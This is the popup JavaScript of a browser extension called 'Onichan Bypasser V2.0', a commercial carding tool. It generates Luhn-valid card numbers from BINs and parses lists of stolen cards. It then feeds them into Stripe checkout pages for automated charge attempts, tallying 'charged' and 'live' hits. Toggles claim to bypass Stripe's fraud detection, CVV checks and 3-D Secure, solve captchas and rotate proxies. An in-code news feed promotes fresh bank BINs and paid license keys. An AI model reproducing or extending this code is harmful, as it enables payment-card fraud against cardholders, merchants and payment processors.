// === Onichan Bypasser V2.0 — Popup ===
const API_BASE = 'https://6cb67840-8f90-4a25-8429-c01871a517a5-00-ahul1e8n76y8.riker.replit.dev';

// ---------- Helpers ----------
function $(id) { return document.getElementById(id); }
async function getCfg() { return new Promise(r => chrome.storage.local.get(null, d => r(d || {}))); }
async function setCfg(p) { return new Promise(r => chrome.storage.local.set(p, r)); }
function escapeHtml(s) {
  return String(s||'').replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
}
function fmtTime(t) {
  const ago = Math.floor((Date.now() - new Date(t).getTime()) / 1000);
  if (ago < 60) return ago + 's';
  if (ago < 3600) return Math.floor(ago/60) + 'm';
  if (ago < 86400) return Math.floor(ago/3600) + 'h';
  return Math.floor(ago/86400) + 'd';
}

// populate years
(function popYears() {
  // Will run again after DOM is ready
})();

// ---------- Init ----------
document.addEventListener('DOMContentLoaded', async () => {
  // populate year selector
  const yearSel = $('expYear');
  if (yearSel) {
    const yr = new Date().getFullYear();
    for (let i = 0; i < 10; i++) {
      const opt = document.createElement('option');
      opt.value = String(yr + i).slice(-2);
      opt.textContent = String(yr + i).slice(-2);
      yearSel.appendChild(opt);
    }
  }

  const cfg = await getCfg();
  const exp = cfg.licenseExpiry ? new Date(cfg.licenseExpiry) : null;
  if (cfg.licenseKey && exp && exp > new Date()) {
    showMain(cfg);
  } else {
    showLogin();
  }
  bindEvents();
});

function showLogin() { $('loginScreen').classList.remove('hidden'); $('mainScreen').classList.add('hidden'); }
async function showMain(cfg) {
  $('loginScreen').classList.add('hidden');
  $('mainScreen').classList.remove('hidden');
  await renderAll(cfg);
}

// ---------- License ----------
async function activateKey() {
  const key = $('keyInput').value.trim().toUpperCase();
  const status = $('loginStatus');
  status.textContent = ''; status.className = 'login-status';
  if (!key) { status.textContent = 'Please enter your premium key 💗'; status.classList.add('error'); return; }
  status.textContent = 'Validating with Onee-chan… ⏳';
  try {
    const res = await fetch(`${API_BASE}/api/bypasser/validate`, {
      method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({key})
    });
    const data = await res.json();
    if (!data.valid) { status.textContent = '❌ ' + (data.error||'Invalid key'); status.classList.add('error'); return; }
    await setCfg({
      licenseKey: data.key, licenseTier: data.tier||'PREMIUM',
      licenseExpiry: data.expires_at, licenseDays: data.days,
      stats: { total: 0, charged: 0, live: 0, dead: 0 },
      history: [], notifications: [],
      stripeSecToggle: true, threeDsToggle: true,
      sec_pasted: true, sec_timing: true, sec_tracking: true, sec_zip: true,
      mod_cf: true, opt_mascot: true, opt_celebrate: true, opt_notif: true, opt_sound: true,
      gw_repl_stripe: true, gw_repl_adyen: true, gw_repl_checkout: true, gw_repl_recurly: true, gw_repl_xsolla: true,
      fillEmail: 'onichan@waifu.gg', fillName: 'Onichan Waifu'
    });
    status.textContent = '✅ Activated! Welcome, master 💗'; status.classList.add('ok');
    chrome.runtime.sendMessage({type:'license_activated'}).catch(()=>{});
    setTimeout(async () => showMain(await getCfg()), 800);
  } catch (e) { status.textContent = '❌ ' + e.message; status.classList.add('error'); }
}

async function logout() {
  if (!confirm('Logout and clear license?')) return;
  await setCfg({licenseKey:null, licenseExpiry:null, licenseTier:null});
  chrome.runtime.sendMessage({type:'license_revoked'}).catch(()=>{});
  showLogin();
}

// ---------- Render all ----------
async function renderAll(cfg) {
  $('tierBadge').textContent = cfg.licenseTier || 'PREMIUM';

  // license countdown
  if (cfg.licenseExpiry) {
    const exp = new Date(cfg.licenseExpiry);
    const ms = exp - new Date();
    const days = Math.floor(ms / 86400000);
    const hours = Math.floor((ms % 86400000) / 3600000);
    $('trialCountdown').textContent = days > 0 ? `${days}d ${hours}h remaining` : `${hours}h remaining`;
    $('licKey').textContent = cfg.licenseKey || '—';
    $('licTier').textContent = cfg.licenseTier || '—';
    $('licExpiry').textContent = exp.toLocaleString();
  }

  // stats
  const s = cfg.stats || {total:0, charged:0, live:0, dead:0};
  $('statTotal').textContent = s.total || 0;
  $('statCharged').textContent = s.charged || 0;
  $('statLive').textContent = s.live || 0;
  $('statDead').textContent = s.dead || 0;

  // restore form values
  const restoreList = ['binCcInput','cvvInput','ccListInput','nopechaKey','proxyInput',
    'fillEmail','fillName'];
  restoreList.forEach(id => { if (cfg[id] !== undefined && $(id)) $(id).value = cfg[id]; });
  ['expMonth','expYear','proxyType'].forEach(id => {
    if (cfg[id] && $(id)) $(id).value = cfg[id];
  });

  // mode (BIN vs CC List)
  const mode = cfg.cardMode || 'bin';
  setMode(mode);

  // toggles & checkboxes
  const toggles = ['cardReplToggle','cvvBypassToggle','paymentUaToggle','stripeSecToggle',
    'threeDsToggle','captchaSolveToggle','hcaptchaEnabled','recaptchaEnabled','proxyEnabled',
    'sec_pasted','sec_timing','sec_tracking','sec_zip','mod_cf',
    'gw_repl_stripe','gw_repl_adyen','gw_repl_checkout','gw_repl_recurly','gw_repl_xsolla',
    'gw_cvv_stripe','gw_cvv_adyen','gw_cvv_checkout','gw_cvv_recurly','gw_cvv_xsolla',
    'hcap_tap','hcap_fallback','rec_open','rec_solve',
    'opt_mascot','opt_sound','opt_notif','opt_celebrate',
    'fillEmailRnd','fillNameRnd'];
  toggles.forEach(id => {
    if ($(id)) $(id).checked = cfg[id] === true;
  });

  // collapse content for unchecked toggle sections
  ['cardRepl','cvvBypass','paymentUa','captchaSolve'].forEach(p => {
    const t = $(p+'Toggle'), c = $(p+'Content');
    if (t && c) c.classList.toggle('hidden', !t.checked);
  });
  ['hcaptcha','recaptcha'].forEach(p => {
    const t = $(p+'Enabled'), c = $(p+'Content');
    if (t && c) c.classList.toggle('hidden', !t.checked);
  });

  // CC list counter
  updateCcCounter();

  // history
  renderHistory(cfg.history || [], cfg.histFilter || 'all');
  $('histList').classList.toggle('blurred', cfg.histBlur !== false);

  // notifications
  renderNotifs(cfg.notifications || []);

  // news
  loadNews();

  // nopecha status
  if (cfg.nopechaKey) {
    $('nopechaStatus').textContent = 'Set';
    $('nopechaStatus').classList.add('ok');
  }

  // proxy
  if (cfg.proxy && cfg.proxy.host) {
    $('proxyInput').value = `${cfg.proxy.host}:${cfg.proxy.port}` +
      (cfg.proxy.username ? `:${cfg.proxy.username}:${cfg.proxy.password}` : '');
  }
}

function setMode(mode) {
  $('binModeContent').classList.toggle('hidden', mode !== 'bin');
  $('ccListModeContent').classList.toggle('hidden', mode !== 'ccList');
  $('binModeBtn').classList.toggle('active', mode === 'bin');
  $('ccListModeBtn').classList.toggle('active', mode === 'ccList');
  setCfg({cardMode: mode});
}

function updateCcCounter() {
  const txt = $('ccListInput').value || '';
  const cards = parseCcList(txt);
  $('ccListCounter').textContent = `📋 ${cards.length} cards`;
}

// ---------- CC list parser ----------
function parseCcList(text) {
  const lines = String(text||'').split(/\r?\n/);
  const out = [];
  for (let line of lines) {
    line = line.trim(); if (!line) continue;
    const parts = line.split(/[\|:; ,\t]+/).filter(Boolean);
    if (parts.length < 1) continue;
    let raw = parts[0].replace(/\D/g,'');
    let num='', mm='', yy='', cvv='';

    // Handle concatenated format: 374355120087083021837231 → num+mm+yy+cvv
    if (parts.length === 1 && raw.length > 16) {
      for (const cardLen of [15, 16]) {
        if (raw.length < cardLen) continue;
        const candidate = raw.slice(0, cardLen);
        if (!luhnCheck(candidate)) continue;
        const rest = raw.slice(cardLen);
        const tryMm = rest.slice(0,2);
        const tryYy = rest.slice(2,4);
        const tryCvv = rest.slice(4);
        if (parseInt(tryMm) >= 1 && parseInt(tryMm) <= 12) {
          num=candidate; mm=tryMm; yy=tryYy; cvv=tryCvv;
          break;
        }
      }
      if (!num) continue;
    } else {
      num = raw;
      if (num.length < 12 || !luhnCheck(num)) continue;
      mm = parts[1] ? parts[1].replace(/\D/g,'').padStart(2,'0').slice(-2) : '';
      yy = parts[2] ? parts[2].replace(/\D/g,'').slice(-2) : '';
      cvv = parts[3] ? parts[3].replace(/\D/g,'') : '';
    }

    if (!num || !luhnCheck(num)) continue;
    if (mm && yy) {
      const expDate = new Date(2000 + parseInt(yy), parseInt(mm), 0);
      if (expDate < new Date()) continue;
    }
    out.push({num, mm, yy, cvv});
  }
  return out;
}

// ---------- Luhn / scheme ----------
function luhnCheck(num) {
  num = String(num).replace(/\D/g,'');
  if (!num.length) return false;
  let sum = 0, alt = false;
  for (let i = num.length - 1; i >= 0; i--) {
    let n = parseInt(num[i]);
    if (alt) { n *= 2; if (n > 9) n -= 9; }
    sum += n; alt = !alt;
  }
  return sum % 10 === 0;
}
function detectScheme(num) {
  num = String(num).replace(/\D/g,'');
  if (/^4/.test(num)) return 'VISA';
  if (/^(5[1-5]|2[2-7])/.test(num)) return 'MASTERCARD';
  if (/^3[47]/.test(num)) return 'AMEX';
  if (/^6/.test(num)) return 'DISCOVER';
  if (/^35/.test(num)) return 'JCB';
  if (/^3[0689]/.test(num)) return 'DINERS';
  return 'UNKNOWN';
}

// ---------- BIN-based card generator ----------
function genCard(bin) {
  bin = String(bin).replace(/\D/g,'');
  const len = /^3[47]/.test(bin) ? 15 : 16;
  let body = bin;
  while (body.length < len - 1) body += Math.floor(Math.random() * 10);
  let sum = 0, alt = true;
  for (let i = body.length - 1; i >= 0; i--) {
    let n = parseInt(body[i]);
    if (alt) { n *= 2; if (n > 9) n -= 9; }
    sum += n; alt = !alt;
  }
  return body + ((10 - (sum % 10)) % 10);
}
function genExp(mmFix, yyFix) {
  const m = mmFix && mmFix !== 'RND' ? mmFix : String(1 + Math.floor(Math.random()*12)).padStart(2,'0');
  const yr = yyFix && yyFix !== 'RND' ? yyFix : String(26 + Math.floor(Math.random()*8));
  return [m, yr];
}
function genCvv(scheme, fix) {
  if (fix && fix !== 'RND' && fix.length >= 3) return fix;
  const len = scheme === 'AMEX' ? 4 : 3;
  let s = ''; for (let i = 0; i < len; i++) s += Math.floor(Math.random()*10);
  return s;
}

// ---------- History ----------
function renderHistory(items, filter) {
  const list = $('histList');
  const filtered = filter === 'all' ? items : items.filter(it => it.status === filter);
  if (!filtered.length) {
    list.innerHTML = '<div class="empty"><div class="empty-icon">📭</div><div>No transactions yet</div></div>';
    return;
  }
  list.innerHTML = filtered.slice(0, 100).map(it => `
    <div class="hist-item">
      <span class="hist-status ${it.status}">${it.status}</span>
      <div class="hist-card">
        <div class="hist-card-num">${escapeHtml(it.card)}</div>
        <div class="hist-card-meta">${escapeHtml(it.gateway||'?')} · ${escapeHtml(it.message||'')}</div>
      </div>
      <span class="hist-time">${fmtTime(it.time)}</span>
    </div>
  `).join('');
}

async function exportHistory() {
  const cfg = await getCfg();
  const items = cfg.history || [];
  if (!items.length) { alert('No history to export'); return; }
  const text = items.map(it => `${it.status.toUpperCase()} | ${it.card} | ${it.gateway||''} | ${it.message||''} | ${new Date(it.time).toISOString()}`).join('\n');
  const blob = new Blob([text], {type:'text/plain'});
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url; a.download = `onichan-history-${Date.now()}.txt`;
  document.body.appendChild(a); a.click(); a.remove();
  URL.revokeObjectURL(url);
}

async function copyHistory() {
  const cfg = await getCfg();
  const items = cfg.history || [];
  if (!items.length) { alert('No history to copy'); return; }
  const text = items.map(it => `${it.card} | ${it.status} | ${it.gateway||''}`).join('\n');
  try {
    await navigator.clipboard.writeText(text);
    alert('Copied ' + items.length + ' entries 💗');
  } catch (e) { alert('Copy failed: ' + e.message); }
}

// ---------- Notifications ----------
function renderNotifs(items) {
  const list = $('notifList');
  if (!items.length) {
    list.innerHTML = '<div class="notif-empty">No new notifications</div>';
    $('notifDot').classList.add('hidden');
    return;
  }
  $('notifDot').classList.remove('hidden');
  list.innerHTML = items.slice(0, 10).map(n => `
    <div class="notif-item">
      <div class="nt">${escapeHtml(n.title)}</div>
      <div class="nm">${escapeHtml(n.message)}</div>
    </div>
  `).join('');
}

// ---------- News ----------
async function loadNews() {
  const list = $('newsList');
  list.innerHTML = '<div class="news-loading">Loading…</div>';
  const newsItems = [
    { title: '🎉 Onichan Bypasser V2.0 Released!',
      body: 'Full Stripe automation, card replacement across 5 gateways, captcha solving, proxy management, and live stats. Same key from bot unlocks all features.',
      time: Date.now() - 3600000 },
    { title: '💳 Fresh BINs This Week',
      body: '520935 (Mastercard / Bank of America), 414720 (Visa / Chase), 542418 (Mastercard / Capital One). All US-based, high approval rate.',
      time: Date.now() - 86400000 },
    { title: '🔧 Stripe Security Update',
      body: 'Stripe rolled out new pasted-field detection. Make sure "Stripe Security Bypass" is ON for best results. Pasted Fields + Time Tracking required.',
      time: Date.now() - 172800000 },
    { title: '🎁 Get 30% off premium',
      body: 'Use code WAIFU30 in @Onichanbabybot — type /buy and apply at checkout. Valid until end of month.',
      time: Date.now() - 432000000 }
  ];
  list.innerHTML = newsItems.map(n => `
    <div class="news-item">
      <div class="news-item-title">${escapeHtml(n.title)}</div>
      <div class="news-item-body">${escapeHtml(n.body)}</div>
      <div class="news-item-time">${fmtTime(n.time)} ago</div>
    </div>
  `).join('');
}

// ---------- Tools (BIN/Luhn/Gen) ----------
async function lookupBin() {
  const bin = ($('binInput').value||'').replace(/\D/g,'').slice(0,8);
  const box = $('binResult'); box.classList.remove('hidden','ok','bad');
  if (bin.length < 6) { box.className='result-card bad'; box.textContent='Enter at least 6 digits'; return; }
  box.className='result-card loading'; box.textContent='Looking up…';
  try {
    const res = await fetch(`https://lookup.binlist.net/${bin}`, {headers:{'Accept-Version':'3'}});
    if (!res.ok) throw new Error('HTTP '+res.status);
    const d = await res.json();
    box.className='result-card ok';
    box.innerHTML = `
      <div class="row"><span>Scheme</span><b>${(d.scheme||'?').toUpperCase()}</b></div>
      <div class="row"><span>Type</span><b>${(d.type||'?').toUpperCase()}</b></div>
      <div class="row"><span>Brand</span><b>${d.brand||'?'}</b></div>
      <div class="row"><span>Bank</span><b>${(d.bank||{}).name||'Unknown'}</b></div>
      <div class="row"><span>Country</span><b>${(d.country||{}).emoji||''} ${(d.country||{}).name||'?'}</b></div>
      <div class="row"><span>Currency</span><b>${(d.country||{}).currency||'?'}</b></div>
    `;
  } catch (e) { box.className='result-card bad'; box.textContent='❌ '+e.message; }
}
function validateLuhn() {
  const num = ($('luhnInput').value||'').replace(/\D/g,'');
  const box = $('luhnResult'); box.classList.remove('hidden','ok','bad');
  if (num.length < 8) { box.className='result-card bad'; box.textContent='Need at least 8 digits'; return; }
  const ok = luhnCheck(num); const scheme = detectScheme(num);
  box.className = 'result-card ' + (ok?'ok':'bad');
  box.innerHTML = `
    <div class="row"><span>Number</span><b>${num.replace(/(.{4})/g,'$1 ').trim()}</b></div>
    <div class="row"><span>Scheme</span><b>${scheme}</b></div>
    <div class="row"><span>Luhn</span><b>${ok?'✅ VALID':'❌ INVALID'}</b></div>`;
}
let lastGen = '';
function generateCards() {
  const bin = ($('genBin').value||'').replace(/\D/g,'').slice(0,8);
  const count = parseInt($('genCount').value)||10;
  const box = $('genResult'); box.classList.remove('hidden','ok','bad');
  if (bin.length < 6) { box.className='result-card bad'; box.textContent='Enter valid 6-8 digit BIN'; return; }
  const scheme = detectScheme(bin);
  const lines = [];
  for (let i = 0; i < count; i++) {
    const [m,y] = genExp();
    lines.push(`${genCard(bin)}|${m}|${y}|${genCvv(scheme)}`);
  }
  lastGen = lines.join('\n');
  box.className='result-card ok';
  box.innerHTML = `<b>Generated ${count} ${scheme} cards:</b><div class="cclist">${lines.map(l=>`<div>${escapeHtml(l)}</div>`).join('')}</div>`;
}
async function copyGen() {
  if (!lastGen) { alert('Generate first 💗'); return; }
  await navigator.clipboard.writeText(lastGen);
  const b = $('copyGenBtn'); const o = b.innerHTML; b.innerHTML='✅ Copied!';
  setTimeout(()=>b.innerHTML=o, 1500);
}
async function loadGenToList() {
  if (!lastGen) { alert('Generate first 💗'); return; }
  $('ccListInput').value = lastGen;
  await setCfg({ccListInput: lastGen, cardMode: 'ccList'});
  setMode('ccList');
  // switch to bypass tab
  document.querySelector('.tab[data-tab="bypass"]').click();
  updateCcCounter();
}

// ---------- Proxy ----------
async function applyProxy() {
  const raw = $('proxyInput').value.trim();
  const parts = raw.split(':');
  if (parts.length < 2) { alert('Format: host:port  or  host:port:user:pass'); return; }
  const proxy = {
    enabled: true, host: parts[0], port: parseInt(parts[1])||0,
    type: $('proxyType').value,
    username: parts[2]||'', password: parts[3]||''
  };
  if (!proxy.host || !proxy.port) { alert('Invalid host/port'); return; }
  await setCfg({proxy, proxyEnabled: true, proxyType: proxy.type, proxyInput: raw});
  $('proxyEnabled').checked = true;
  chrome.runtime.sendMessage({type:'proxy_apply', proxy}).catch(()=>{});
  // test it
  testProxy();
}
async function clearProxy() {
  await setCfg({proxy:{enabled:false}, proxyEnabled: false});
  $('proxyEnabled').checked = false;
  chrome.runtime.sendMessage({type:'proxy_clear'}).catch(()=>{});
  $('proxyStatus').classList.add('hidden');
}
async function testProxy() {
  $('proxyStatus').classList.remove('hidden');
  $('proxyCountry').textContent = 'Testing…';
  $('proxyIp').textContent = '...';
  const t0 = Date.now();
  try {
    const res = await fetch('https://api.ipify.org?format=json', {cache:'no-store'});
    const d = await res.json();
    const ms = Date.now() - t0;
    let geo = {};
    try { geo = await (await fetch(`https://ipapi.co/${d.ip}/json/`)).json(); } catch {}
    const flag = geo.country_code ? String.fromCodePoint(...[...geo.country_code].map(c=>0x1F1E6+c.charCodeAt(0)-65)) : '🌍';
    $('proxyFlag').textContent = flag;
    $('proxyCountry').textContent = geo.country_name || 'Unknown';
    $('proxyIp').textContent = d.ip;
    $('proxyLatency').textContent = ms + ' ms';
    $('proxyCity').textContent = geo.city || '-';
  } catch (e) {
    $('proxyCountry').textContent = 'Test failed';
    $('proxyIp').textContent = e.message;
  }
}

// ---------- Stripe automation start (sends to active tab) ----------
function setStartStatus(text, kind) {
  const el = $('startStatus'); if (!el) return;
  el.textContent = text;
  el.className = 'start-status' + (kind ? ' ' + kind : '');
}

async function refreshStartStatus() {
  const cfg = await getCfg();
  const cards = cfg.cardMode === 'ccList'
    ? parseCcList(cfg.ccListInput || '')
    : (cfg.binCcInput && cfg.binCcInput.length >= 6 ? generateBatchFromBin(cfg) : []);
  let tabUrl = '';
  try {
    const [tab] = await chrome.tabs.query({active:true, currentWindow:true});
    tabUrl = tab?.url || '';
  } catch {}
  const isStripe = /stripe\.com\/(c|pay|buy|donate)/.test(tabUrl);
  if (!cards.length) {
    setStartStatus('⚠️ No cards loaded · add BIN or paste CC List', 'warn');
  } else if (!isStripe) {
    setStartStatus(`✅ ${cards.length} cards ready · Open a Stripe checkout page`, 'warn');
  } else {
    setStartStatus(`💗 ${cards.length} cards ready · Stripe page detected`, 'ok');
  }
}

async function startAutomation() {
  const cfg = await getCfg();
  const cards = cfg.cardMode === 'ccList'
    ? parseCcList(cfg.ccListInput || '')
    : generateBatchFromBin(cfg);

  if (!cards.length) {
    setStartStatus('❌ No valid cards — paste a CC List or enter a BIN', 'err');
    return;
  }

  const [tab] = await chrome.tabs.query({active:true, currentWindow:true});
  if (!tab) { setStartStatus('❌ No active tab', 'err'); return; }

  // Always save the loaded cards + settings so the overlay/content script
  // can pick them up the moment the user lands on Stripe.
  try {
    await chrome.storage.local.set({
      oni_pending_cards: cards,
      oni_pending_settings: cfg,
      oni_pending_ts: Date.now()
    });
  } catch {}

  const isStripe = /stripe\.com\/(c|pay|buy|donate|checkout)/.test(tab.url||'');

  // ── Try to inject the overlay/content script into the active tab so the
  // user always sees a control surface, even on non-Stripe pages.
  try {
    await chrome.scripting.executeScript({
      target: {tabId: tab.id, allFrames: false},
      files: ['stripe-overlay.js']
    });
  } catch (_) { /* page may forbid injection (chrome://, store, etc) */ }

  if (!isStripe) {
    setStartStatus(`💗 ${cards.length} cards saved · open a Stripe checkout to start`, 'warn');
    // Close popup so user can navigate; overlay (if injected) will pick up cards
    setTimeout(() => window.close(), 600);
    return;
  }

  setStartStatus(`🚀 Starting on ${cards.length} cards…`, 'ok');
  $('startHitBtn').classList.add('hidden');
  $('stopHitBtn').classList.remove('hidden');
  try {
    const res = await chrome.runtime.sendMessage({
      type: 'START_AUTOMATION',
      tabId: tab.id, cards, settings: cfg
    });
    if (!res?.ok) throw new Error(res?.error || 'start failed');
    setStartStatus(`⚡ Running · ${cards.length} cards queued`, 'ok');
    // Close popup so user can watch the overlay run on the page
    setTimeout(() => window.close(), 800);
  } catch (e) {
    setStartStatus('❌ ' + e.message, 'err');
    $('startHitBtn').classList.remove('hidden');
    $('stopHitBtn').classList.add('hidden');
  }
}

async function stopAutomation() {
  try {
    const [tab] = await chrome.tabs.query({active:true, currentWindow:true});
    await chrome.runtime.sendMessage({type:'STOP_AUTOMATION', tabId: tab?.id});
  } catch {}
  $('startHitBtn').classList.remove('hidden');
  $('stopHitBtn').classList.add('hidden');
  setStartStatus('⏹ Stopped', 'warn');
}
function generateBatchFromBin(cfg) {
  const bin = (cfg.binCcInput||'').replace(/\D/g,'');
  if (bin.length < 6) return [];
  const scheme = detectScheme(bin);
  const out = [];
  for (let i = 0; i < 50; i++) {
    const [m,y] = genExp(cfg.expMonth, cfg.expYear);
    out.push({num: genCard(bin), mm: m, yy: y, cvv: genCvv(scheme, cfg.cvvInput)});
  }
  return out;
}

// ---------- Bind events ----------
function bindEvents() {
  $('activateBtn').addEventListener('click', activateKey);
  $('keyInput').addEventListener('keydown', e => { if (e.key==='Enter') activateKey(); });
  $('logoutBtn').addEventListener('click', logout);
  $('logoutBtn2')?.addEventListener('click', logout);

  // start / stop hitting
  $('startHitBtn')?.addEventListener('click', startAutomation);
  $('stopHitBtn')?.addEventListener('click', stopAutomation);
  refreshStartStatus();

  // tabs
  document.querySelectorAll('.tab').forEach(t => t.addEventListener('click', () => {
    document.querySelectorAll('.tab').forEach(x => x.classList.remove('active'));
    document.querySelectorAll('.tab-pane').forEach(x => x.classList.remove('active'));
    t.classList.add('active');
    $('tab-' + t.dataset.tab).classList.add('active');
  }));

  // mode toggles
  $('binModeBtn').addEventListener('click', () => setMode('bin'));
  $('ccListModeBtn').addEventListener('click', () => setMode('ccList'));

  // CC list counter
  $('ccListInput').addEventListener('input', () => {
    updateCcCounter();
    setCfg({ccListInput: $('ccListInput').value});
    refreshStartStatus();
  });

  // text inputs persist
  ['binCcInput','cvvInput','nopechaKey','proxyInput','fillEmail','fillName'].forEach(id => {
    $(id)?.addEventListener('input', () => {
      setCfg({[id]: $(id).value});
      if (id === 'binCcInput' || id === 'cvvInput') refreshStartStatus();
    });
  });
  ['expMonth','expYear','proxyType'].forEach(id => {
    $(id)?.addEventListener('change', () => setCfg({[id]: $(id).value}));
  });

  // Section toggles (collapse/expand)
  const sectionToggles = [
    ['cardReplToggle','cardReplContent'],
    ['cvvBypassToggle','cvvBypassContent'],
    ['paymentUaToggle','paymentUaContent'],
    ['captchaSolveToggle','captchaSolveContent']
  ];
  sectionToggles.forEach(([t,c]) => {
    const el = $(t);
    el?.addEventListener('change', () => {
      $(c).classList.toggle('hidden', !el.checked);
      setCfg({[t]: el.checked});
      chrome.runtime.sendMessage({type:'config_changed'}).catch(()=>{});
    });
  });
  ['hcaptcha','recaptcha'].forEach(p => {
    $(p+'Enabled')?.addEventListener('change', () => {
      $(p+'Content').classList.toggle('hidden', !$(p+'Enabled').checked);
      setCfg({[p+'Enabled']: $(p+'Enabled').checked});
    });
  });

  // all generic checkbox toggles
  const allToggles = ['stripeSecToggle','threeDsToggle','proxyEnabled',
    'sec_pasted','sec_timing','sec_tracking','sec_zip','mod_cf',
    'gw_repl_stripe','gw_repl_adyen','gw_repl_checkout','gw_repl_recurly','gw_repl_xsolla',
    'gw_cvv_stripe','gw_cvv_adyen','gw_cvv_checkout','gw_cvv_recurly','gw_cvv_xsolla',
    'hcap_tap','hcap_fallback','rec_open','rec_solve',
    'opt_mascot','opt_sound','opt_notif','opt_celebrate',
    'fillEmailRnd','fillNameRnd'];
  allToggles.forEach(id => {
    $(id)?.addEventListener('change', () => {
      setCfg({[id]: $(id).checked});
      chrome.runtime.sendMessage({type:'config_changed'}).catch(()=>{});
    });
  });

  // notification dropdown
  $('notifBtn').addEventListener('click', () => $('notifDropdown').classList.toggle('hidden'));
  $('notifClear').addEventListener('click', async () => {
    await setCfg({notifications: []}); renderNotifs([]);
  });

  // history
  document.querySelectorAll('.filter-btn').forEach(b => b.addEventListener('click', async () => {
    document.querySelectorAll('.filter-btn').forEach(x => x.classList.remove('active'));
    b.classList.add('active');
    await setCfg({histFilter: b.dataset.filter});
    const cfg = await getCfg();
    renderHistory(cfg.history || [], b.dataset.filter);
  }));
  $('histBlurBtn').addEventListener('click', async () => {
    const cfg = await getCfg();
    const blur = !cfg.histBlur;
    await setCfg({histBlur: blur});
    $('histList').classList.toggle('blurred', blur);
    $('histBlurIcon').textContent = blur ? '👁️' : '🙈';
    $('histBlurText').textContent = blur ? 'Unblur' : 'Blur';
  });
  $('histClearBtn').addEventListener('click', async () => {
    if (!confirm('Clear all history?')) return;
    await setCfg({history: []});
    renderHistory([], 'all');
  });
  $('histExportBtn').addEventListener('click', exportHistory);
  $('histCopyBtn').addEventListener('click', copyHistory);

  // news refresh
  $('newsRefreshBtn').addEventListener('click', loadNews);

  // proxy
  $('proxyApplyBtn').addEventListener('click', applyProxy);
  $('proxyClearBtn').addEventListener('click', clearProxy);
  $('proxyTestBtn').addEventListener('click', testProxy);

  // tools
  $('binLookupBtn').addEventListener('click', lookupBin);
  $('binInput').addEventListener('keydown', e => { if (e.key==='Enter') lookupBin(); });
  $('luhnBtn').addEventListener('click', validateLuhn);
  $('luhnInput').addEventListener('keydown', e => { if (e.key==='Enter') validateLuhn(); });
  $('genBtn').addEventListener('click', generateCards);
  $('copyGenBtn').addEventListener('click', copyGen);
  $('loadGenBtn').addEventListener('click', loadGenToList);

  // settings actions
  $('resetStatsBtn').addEventListener('click', async () => {
    if (!confirm('Reset all statistics?')) return;
    await setCfg({stats:{total:0,charged:0,live:0,dead:0}, history: []});
    const cfg = await getCfg();
    renderAll(cfg);
  });
  $('exportAllBtn').addEventListener('click', async () => {
    const cfg = await getCfg();
    const dump = JSON.stringify({stats:cfg.stats, history:cfg.history, generated:Date.now()}, null, 2);
    const blob = new Blob([dump], {type:'application/json'});
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url; a.download = `onichan-export-${Date.now()}.json`;
    a.click(); URL.revokeObjectURL(url);
  });

  // listen for stat updates from background
  chrome.runtime.onMessage.addListener(msg => {
    if (msg.type === 'stats_updated') {
      getCfg().then(renderAll);
      if (msg.celebrate) {
        getCfg().then(cfg => {
          if (cfg.opt_celebrate !== false) celebrate(msg.celebrate);
        });
      }
    } else if (msg.type === 'history_updated') {
      getCfg().then(renderAll);
    }
  });

  // make tab area also start automation when on stripe page
  // (handled by the floating overlay on the page itself)
}

// ---------- Celebration ----------
function celebrate(kind) {
  const overlay = $('celebrate'), img = $('celebrateImg'), txt = $('celebrateText');
  if (kind === 'charged') { img.src = 'images/payment.png'; txt.textContent = 'CHARGED! 💗'; }
  else if (kind === 'live') { img.src = 'images/hit.png'; txt.textContent = 'LIVE HIT! 💗'; }
  else { img.src = 'images/hit.png'; txt.textContent = 'BYPASSED! 💗'; }
  overlay.classList.remove('hidden');
  setTimeout(() => overlay.classList.add('hidden'), 2500);
}
